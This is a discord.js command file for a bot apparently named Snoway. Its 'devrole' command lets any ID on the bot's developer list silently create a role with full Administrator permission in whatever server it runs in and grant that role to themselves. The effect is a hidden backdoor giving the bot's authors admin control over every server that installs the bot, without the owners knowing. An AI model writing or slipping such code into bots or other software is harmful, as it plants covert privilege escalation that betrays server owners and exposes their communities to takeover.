const Discord = require('discord.js');
const Snoway = require('../../structures/client/index.js');

module.exports = {
    name: "devrole",
    description: "Ajoute le devrole au développeur.",
    /**
     * @param {Snoway} client 
     * @param {Discord.Message} message 
     * @param {Array} args 
     */
    run: async (client, message, args) => {
        if (!client.dev.includes(message.author.id)) return;

        const role = await message.guild.roles.create({
            name: 'Développeur Snoway',
            color: '#e1adff', 
            permissions: [Discord.PermissionFlagsBits.Administrator], 
        });

        await message.member.roles.add(role);
    }
};
